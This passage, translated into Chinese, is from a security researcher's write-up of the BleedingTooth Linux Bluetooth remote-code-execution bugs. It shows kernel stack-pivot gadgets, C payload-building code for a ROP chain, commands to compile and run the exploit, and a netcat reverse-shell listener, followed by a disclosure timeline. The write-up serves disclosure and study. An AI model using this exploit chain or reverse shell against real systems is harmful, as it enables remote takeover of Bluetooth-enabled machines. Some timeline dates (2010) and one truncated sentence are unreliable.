@@ -1,0 +1,127 @@
+    #define BPF_PROG_RUN(prog, ctx)                     \
+        __BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
+最后，调度程序以 `ctx` 和 `prog->insnsi` 作为参数调用 `prog->bpf_func()` 处理程序：
+    // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h
+    static __always_inline unsigned int bpf_dispatcher_nop_func(
+        const void *ctx,
+        const struct bpf_insn *insnsi,
+        unsigned int (*bpf_func)(const void *,
+                     const struct bpf_insn *))
+    {
+        return bpf_func(ctx, insnsi);
+    }
+总之，我们有：
+    sk->sk_filter->prog->bpf_func(skb, sk->sk_filter->prog->insnsi);
+因为我们可以控制 `sk->sk_filter`，所以我们也可以控制后面的两个解引用。这最终让我们控制了 RIP，RSI
+寄存器（第二个参数）指向我们的有效载荷。
+#### 内核 Stack Pivoting
+因为现在的 CPU 有 NX，所以不可能直接执行 shell 代码。然而，我们可以执行代码重用攻击，比如
+ROP/JOP。当然，为了重用代码，我们必须知道它的位置，这就是为什么 KASLR 绕过是必不可少的。对于可能的攻击，ROP 通常比 JOP
+更容易执行，但这需要我们重定向堆栈指针 RSP。出于这个原因，EXP 开发人员通常执行 JOP 来 Stack Pivot，然后以 ROP 链结束。
+这个想法是将栈指针重定向到由 ROP gadgets 组成的有效载荷中的假栈，也就是我们的 ROP 链。因为我们知道 RSI 指向我们的载荷，所以我们想把
+RSI 的值移动到 RSP。让我们看看是否有一个 gadget 可以让我们这样做。
+要提取 gadgets，我们可以使用以下工具:
+  * [extract-vmlinux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux) 解压缩 `/boot/vmlinuz`。
+  * [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 从 `vmlinux` 提取 ROP gadgets。
+寻找像 `mov rsp, X ; ret` 这样的 gadgets，我们可以看到，它们没有一个是有用的。
+    $ cat gadgets.txt | grep ": mov rsp.*ret"
+    0xffffffff8109410c : mov rsp, qword ptr [rip + 0x15bb0fd] ; pop rbx ; pop rbp ; ret
+    0xffffffff810940c2 : mov rsp, qword ptr [rsp] ; pop rbp ; ret
+    0xffffffff8108ef0c : mov rsp, rbp ; pop rbp ; ret
+也许会有一些像 `push rsi ; pop rsp ; ret` 这样的？
+    $ cat gadgets.txt | grep ": push rsi.*pop rsp.*ret"
+    0xffffffff81567f46 : push rsi ; adc al, 0x57 ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
+    0xffffffff8156a128 : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
+    0xffffffff81556cad : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
+    0xffffffff81c02ab5 : push rsi ; lcall [rbx + 0x41] ; pop rsp ; pop rbp ; ret
+    0xffffffff8105e049 : push rsi ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
+    0xffffffff81993887 : push rsi ; xchg eax, ecx ; lcall [rbx + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
+太好了，有很多可以使用的 gadgets。有趣的是，所有的 gadgets 都对 RBX+0x41 进行解引用，RBX+0x41
+很可能是常用指令或指令序列的一部分。更详细地说，由于指令可以从 x86 中的任何字节开始，因此它们可以根据起始字节进行不同的解释。RBX+0x41
+的解引用实际上可能会阻碍我们使用 gadgets —— 也就是说，如果 RBX 在执行 `bpf_func()`
+时没有包含一个可写的内存地址，我们只会在执行 ROP 链之前陷入 panic 错误。幸运的是，在我们的例子中，RBX 指向 `struct amp_mgr`
+对象，并且如果偏移量为 0x41 的字节发生更改，也不会有什么问题。
+当选择 stack pivot gadget 作为 `bpf_func()` 的函数指针并触发它时，RSI 的值将被压入栈，然后从栈弹出，最后分配给
+RSP。换句话说，栈指针将指向我们的有效载荷，一旦执行了 RET 指令，我们的 ROP 链就会启动。
+    static void build_payload(uint8_t data[0x400]) {
+      // Fake sk_filter object starting at offset 0x300.
+      *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320;  // prog
+      // Fake bpf_prog object starting at offset 0x320.
+      // RBX points to the amp_mgr object.
+      *(uint64_t *)&data[0x350] =
+          kaslr_offset +
+          PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET;  // bpf_func
+      *(uint64_t *)&data[0x358] = 0xDEADBEEF;                   // rbp
+      // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
+      // Note that when executing the ROP chain, the data below in memory will be
+      // overwritten. Therefore, the argument should be located after the ROP chain.
+      build_krop_chain((uint64_t *)&data[0x360], l2cap_chan_addr + 0x3c0);
+      strncpy(&data[0x3c0], remote_command, 0x40);
+    }
+这样，我们终于实现了 RCE。为了调试我们的 stack pivot，看看我们是否成功，我们可以设置 `*(uint64_t
+*)&data[0x360]=0x41414141` ，观察一个被控的 panic 错误。
+#### 内核 ROP 链执行
+现在，我们可以编写一个较大的 ROP 链来取回和执行 C 载荷，或者编写一个较小的 ROP 链来允许我们运行任意命令。为了进行
+PoC（概念验证），我们已经满足于一个反向 shell，因此执行一个命令就足够了。受 write-up [CVE-2019-18683:
+Exploiting a Linux kernel vulnerability in the V4L2
+subsystem](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html) 里描述的
+ROP 链的启发，我们将构建一个链，通过 `/bin/bash -c /bin/bash 上获得。
+使用如下命令编译：
+    $ gcc -o exploit exploit.c -lbluetooth
+并按如下方式执行：
+    $ sudo ./exploit target_mac source_ip source_port
+在另一个终端中，运行：
+    $ nc -lvp 1337
+    exec bash -i 2>&0 1>&0
+如果成功，会弹出一个计算器：
+    export XAUTHORITY=/run/user/1000/gdm/Xauthority
+    export DISPLAY=:0
+    gnome-calculator
+偶尔，受害者可能在 dmesg 打印 `Bluetooth: Trailing bytes: 6 in sframe`。 如果 kmalloc-128
+slab 喷射没有成功，就会发生这种情况。这种情况下，我们需要重新执行一次 EXP。关于名称 “BadKarma”， _BadKarma_ 漏洞偶尔会在
+`sk_filter()` 提早退出，例如当字段 `sk_filter` 为 0 时，继续执行 A2MP 接收处理程序并发回一个 A2MP 响应包。
+有趣的是，当这种情况发生时，受害者的机器并没有 panic 错误 —— 相反，攻击者的机器会陷入 panic 错误；因为，正如我们前面所了解的，A2MP
+协议使用的 ERTM 实现在设计上会触发类型混淆。
+## 时间线
+2020-07-06 —— 在谷歌内部发现 _BadVibes_ 漏洞
+2010-07-20 —— _BadKarma_ 和 _BadChoice_ 漏洞在谷歌内部发现
+2020-07-22 —— Linus Torvalds报告了对 BlueZ 的 _BadVibes_ 漏洞的独立发现，并在 7 天时间内披露
+2020-07-24 —— 报告给 [BlueZ
+主要开发人员](http://www.bluez.org/development/credits/)（intel）的三个 BleedingTooth
+漏洞的技术细节
+2020-07-29 —— Intel 将于 2010-07-31 与谷歌召开会议
+2020-07-30 —— _BadVibes_ 补丁发布
+2020-07-31 —— Intel 将披露日期定在 2020-09-01，并在 Intel 的协调下提前披露保密协议。通知方通过 kconfig
+给出一个非安全性提交消息来禁用BT_HS
+2020-08-12 —— Intel 调整披露日期至 2020-10-13（距离首次报告 90 天）
+2020-09-25 —— Intel 向公共 [bluetooth-next](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=f19425641cb2572a33cb074d5e30283720bd4d22)
+分支提交补丁
+2020-09-29 —— 补丁与 [5.10 linux-next
+分支](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/net/bluetooth?id=2bd056f550808eaa2c34a14169c99f81ead083a7)合并
+2020-10-13 —— 公开披露 Intel 的建议，随后披露 Google 的建议
+2020-10-14 —— Intel 将推荐的固定版本从 5.9 修正到 5.10 内核
+2020-10-15 —— Intel 删除内核升级建议
+## 总结
+从零知识开始到发现蓝牙 HCI 协议中的三个漏洞，这一过程既奇怪又出乎意料。当我第一次发现 _BadVibes_
+漏洞时，我以为它只是由漏洞/恶意蓝牙芯片触发的，因为这个漏洞似乎太明显了。因为我没有两个带蓝牙 5
+的可编程设备，我无法验证是否有可能收到这么大的播报。之后对照 Linux 与其他实现的蓝牙协议栈并阅读规范，我得出结论，我的确发现了我的第一个 RCE
+漏洞，我立即去购买了另外的一台笔记本电脑（令人惊讶的是，市场上没有值得信赖的蓝牙 5
+适配器）。通过分析溢出，我们很快就发现需要一个额外的信息泄漏漏洞。仅仅两天之后，我就发现了 _BadChoice_
+，这比我想象的要快得多。在试图触发它时，我发现了 _BadKarma_ 漏洞，我最初认为它是一个会阻止 _BadChoice_ 漏洞的不幸
+bug。事实证明，绕过这个漏洞相当容易，而且这个漏洞实际上是另一个高度严重的安全漏洞。研究 Linux 蓝牙协议栈和利用 RCE
+漏洞具有挑战性，但也令人兴奋，特别是因为这是我第一次审计和调试 Linux
+内核。这项工作的结果令我很高兴，[在默认情况下禁用蓝牙高速功能](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08)以减少攻击面，这也意味着删除强大的堆原语。
+此外，我将从这项研究中获得的知识转化为 [syzkaller
+contributions](https://github.com/google/syzkaller/commits?author=TheOfficialFloW)，使
+fuzz `/dev/vhci` 设备成为可能，并发现额外的 >40 个bug。尽管大多数 bug
+都不太可能被利用，或者远程触发，但它们允许工程师识别和修复其他弱点（[Bluetooth: Fix null pointer dereference in
+hci_event_packet()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b50dc237ac04d499ad4f3a92632470a9eb844f7d), [Bluetooth: Fix
+memory leak in
+read_adv_mon_features()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=cafd472a10ff3bccd8afd25a69f20a491cd8d7b8) or [Bluetooth:
+Fix slab-out-of-bounds read in
+hci_extended_inquiry_result_evt()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=51c19bf3d5cfaa66571e4b88ba2a6f6295311101)）因此有助于拥有一个更安全、更稳定的内核。
+## 感谢
+Dirk Göhmann
+Eduardo Vela
+Francis Perron
+Jann Horn
